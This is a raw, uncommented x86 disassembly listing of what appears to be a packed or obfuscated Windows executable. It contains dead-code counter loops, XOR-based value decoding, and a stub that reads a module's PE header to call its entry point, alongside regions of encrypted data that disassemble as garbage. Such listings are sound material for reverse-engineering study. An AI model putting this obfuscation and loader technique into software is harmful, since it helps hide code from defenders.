  409c28:	mov    ds:0x7f8e4590,eax
  409c2d:	jne    0x409c4b
  409c2f:	mov    edi,0x91aa0794
  409c34:	xor    al,cl
  409c36:	add    ch,BYTE PTR [ecx+0x55]
  409c39:	sub    eax,0x8fe5d515
  409c3e:	js     0x409be8
  409c40:	xor    esp,edx
  409c42:	fbstp  TBYTE PTR [ebp+0x76]
  409c45:	mov    eax,ds:0xf9293caa
  409c4a:	inc    ecx
  409c4b:	cmc    
  409c4c:	fmul   QWORD PTR [edi+0x62ef5e52]
  409c52:	mov    eax,ds:0x208466ba
  409c57:	push   eax
  409c58:	xchg   ecx,eax
  409c59:	and    cl,BYTE PTR [esi+0x2bc2db43]
  409c5f:	adc    al,0xbc
  409c61:	fidiv  DWORD PTR [ebp+0xd]
  409c64:	or     DWORD PTR [edi-0x1abda82f],esi
  409c6a:	cld    
  409c6b:	mov    eax,0xc781bdd0
  409c70:	mov    ebx,0xc05ea5c6
  409c75:	inc    esi
  409c76:	retf   0x6611
  409c79:	or     bl,dl
  409c7b:	or     eax,0xd5b6e0a
  409c80:	arpl   si,bx
  409c82:	pop    ebx
  409c83:	adc    DWORD PTR [ebx-0x25],ecx
  409c86:	test   DWORD PTR [ebp+eax*8+0x67],eax
  409c8a:	(bad)  
  409c8c:	xor    al,0x78
  409c8e:	pop    es
  409c8f:	aaa    
  409c90:	cwde   
  409c91:	out    0x8e,al
  409c93:	fisttp QWORD PTR [ebx]
  409c95:	cmp    BYTE PTR [edi+eiz*4],al
  409c98:	scas   al,BYTE PTR es:[edi]
  409c99:	pop    ds
  409c9a:	or     eax,0xe089c3f3
  409c9f:	loopne 0x409ca6
  409ca1:	mov    eax,ds:0xca67790
  409ca6:	data16 std 
  409ca8:	xchg   esp,eax
  409ca9:	mov    BYTE PTR [edx],dh
  409cab:	scas   eax,DWORD PTR es:[edi]
  409cac:	in     eax,0x3d
  409cae:	dec    eax
  409caf:	push   ds
  409cb0:	arpl   WORD PTR [edx],si
  409cb2:	mov    eax,ebx
  409cb4:	cld    
  409cb5:	mov    bl,0x36
  409cb7:	mov    esi,0x3040ec84
  409cbc:	aad    0xe2
  409cbe:	inc    eax
  409cbf:	mov    ds:0x94679371,al
  409cc4:	fcom   DWORD PTR [edi]
  409cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc7:	xchg   esp,eax
  409cc8:	imul   DWORD PTR [ebx-0x4c]
  409ccb:	je     0x409d0e
  409ccd:	inc    esp
  409cce:	sub    al,0x3c
  409cd0:	dec    edx
  409cd1:	xor    edx,eax
  409cd3:	mov    edi,0xffcd8d64
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43437a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432d36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432de2,0x43438a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432d92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432dd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432dd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ca2
  409d6a:	add    DWORD PTR ds:0x434421,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432dc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434421,0x434415
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432704,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434429,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43439a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43439a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43439a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43439a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43439a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432833
  409df1:	push   0x432718
  409df6:	call   DWORD PTR ds:0x432cfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4343a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4343a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4343a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4343a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d02
  409e3b:	cmp    DWORD PTR ds:0x4343a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43442d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432700,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432700
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432700,ecx
  409e72:	cmp    DWORD PTR ds:0x432700,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4329d6
  409e98:	cmp    DWORD PTR ds:0x432700,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4326ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4326ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4326ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4326ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4329da
  409ed4:	cmp    DWORD PTR ds:0x4326ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432dd6
  409ee7:	xor    DWORD PTR ds:0x43439e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4326f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4326f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4326f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4326f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432de6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4326f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4326f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4328ab
  409f9a:	call   DWORD PTR ds:0x432d0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4326f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4326f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4326f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4326f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434415,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43438e,0x43437a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43438a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434415,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432dde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4326f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434386,0x4326f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432dde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432dde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432dde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432dde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d0e
  40a07d:	cmp    DWORD PTR ds:0x432dde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434396,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434396
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434396,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434396,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432805
  40a0b5:	push   0x43281d
  40a0ba:	call   DWORD PTR ds:0x4329de
  40a0c0:	cmp    DWORD PTR ds:0x434396,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434396
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434396,ecx
  40a0da:	cmp    DWORD PTR ds:0x434396,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434366
  40a0f4:	sbb    DWORD PTR ds:0x434415,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432dd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4326f0,0x434415
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434392,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432dce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434419,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434411,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43436a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43439a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43439a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43439a,edx
  40a19c:	cmp    DWORD PTR ds:0x43439a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43439a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432909
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4329e2
  40a1d3:	cmp    DWORD PTR ds:0x43439a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43439a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43439a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43439a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432dce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432dce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432dce,edx
  40a227:	cmp    DWORD PTR ds:0x432dce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4329e6
  40a23a:	cmp    DWORD PTR ds:0x432dce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434425
  40a48a:	sub    ecx,DWORD PTR ds:0x43442d
  40a490:	mov    DWORD PTR ds:0x434425,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434392,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434392,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434392,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43437a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432c56
  40a4d4:	cmp    DWORD PTR ds:0x434392,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434392
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434392,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434392
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434392,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432de6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434465
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434372,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434366
  40a525:	and    eax,DWORD PTR ds:0x4326f4
  40a52b:	mov    ds:0x434366,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432dde,0x4326f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434396,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432dca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432dca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432dca,ebx
  40a564:	cmp    DWORD PTR ds:0x432dca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432c5a
  40a57a:	cmp    DWORD PTR ds:0x432dca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4343a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4343a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4343a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4343a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4343a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432c5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	pop    esi
  40a5e6:	and    bl,ch
  40a5e8:	ds shl al,cl
  40a5eb:	jo     0x40a65d
  40a5ed:	xchg   ebp,eax
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a599
  40a5f2:	add    eax,DWORD PTR [esi]
  40a5f4:	outs   dx,BYTE PTR ds:[esi]
  40a5f5:	aam    0xf0
  40a5f7:	jp     0x40a5be
  40a5f9:	leave  
  40a5fa:	ffreep st(7)
  40a5fc:	aad    0xc2
  40a5fe:	inc    edi
  40a5ff:	inc    ebx
  40a600:	jmp    0xad1ae03e
  40a605:	xchg   ecx,eax
  40a606:	sbb    al,0x57
  40a608:	inc    BYTE PTR [ebp-0x518a152d]
  40a60e:	or     DWORD PTR [ecx+ecx*4+0x14],esi
  40a612:	int3   
  40a613:	push   edx
  40a614:	fidiv  WORD PTR [eax+0x5db1341]
  40a61a:	loope  0x40a5f0
  40a61c:	icebp  
  40a61d:	cmp    DWORD PTR [edx+0x29222413],edi
  40a623:	(bad)  
  40a624:	in     al,dx
  40a625:	sub    ebx,DWORD PTR [ebp+0x6c]
  40a628:	aaa    
  40a629:	or     DWORD PTR [ebx+0x15964453],0xfffffffa
  40a630:	test   al,0x12
  40a632:	add    eax,0xba45aeb0
  40a637:	inc    ebx
  40a638:	and    BYTE PTR [eax],bh
  40a63a:	dec    eax
  40a63b:	in     al,dx
  40a63c:	xchg   esp,eax
  40a63d:	push   edx
  40a63e:	mov    ds:0xd8ca5367,al
  40a643:	pop    ss
  40a644:	pop    esp
  40a645:	aam    0xab
  40a647:	or     edx,edi
  40a649:	jmp    0x7a6e:0x39189f3c
  40a650:	enter  0xd962,0x52
  40a654:	mov    BYTE PTR [esi],al
  40a656:	sbb    DWORD PTR [eax+0x4daab7ba],ebx
  40a65c:	imul   ebx,esi,0xffffff91
  40a65f:	or     eax,0x6356cd0d
  40a664:	test   DWORD PTR [eax+eiz*4+0x53261de],ebp
  40a66b:	xlat   BYTE PTR ds:[ebx]
  40a66c:	adc    DWORD PTR [eax-0x12afaf20],0x2c61efb
  40a676:	xor    al,BYTE PTR [edi-0x4e]
  40a679:	jle    0x40a6d5
  40a67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67c:	jbe    0x40a647
  40a67e:	(bad)  
  40a67f:	daa    
  40a680:	cld    
  40a681:	gs das 
  40a683:	(bad)  
  40a684:	hlt    
  40a685:	sub    al,0xb
  40a687:	ret    0xfe8e
  40a68a:	pop    ebx
  40a68b:	arpl   WORD PTR [esi],di
  40a68d:	xchg   BYTE PTR [edx+0x186ab1b4],dh
  40a693:	shr    ebp,cl
  40a695:	jo     0x40a6a7
  40a697:	clc    
  40a698:	xor    eax,0xc237afb1
  40a69d:	mov    ecx,ebx
  40a69f:	stos   BYTE PTR es:[edi],al
  40a6a0:	es test eax,0x4ad9d1b2
  40a6a6:	push   esi
  40a6a7:	shl    al,0xa6
  40a6aa:	inc    esi
  40a6ab:	lahf   
  40a6ac:	nop
  40a6ad:	mov    al,ds:0x5ed6d3b
  40a6b2:	push   edx
  40a6b3:	push   es
  40a6b4:	(bad)  
  40a6b5:	bound  ecx,QWORD PTR [eax+0x47]
  40a6b8:	cwde   
  40a6b9:	shl    DWORD PTR [edx+eiz*2-0x19],1
  40a6bd:	(bad)  
  40a6be:	xor    bl,BYTE PTR [edi]
  40a6c0:	or     ecx,esi
  40a6c2:	hlt    
  40a6c3:	add    DWORD PTR [ebx+edx*2-0x43],edi
  40a6c7:	js     0x40a716
  40a6c9:	jbe    0x40a69f
  40a6cb:	xchg   esp,eax
  40a6cc:	aas    
  40a6cd:	mov    ds:0x94ef6bc0,eax
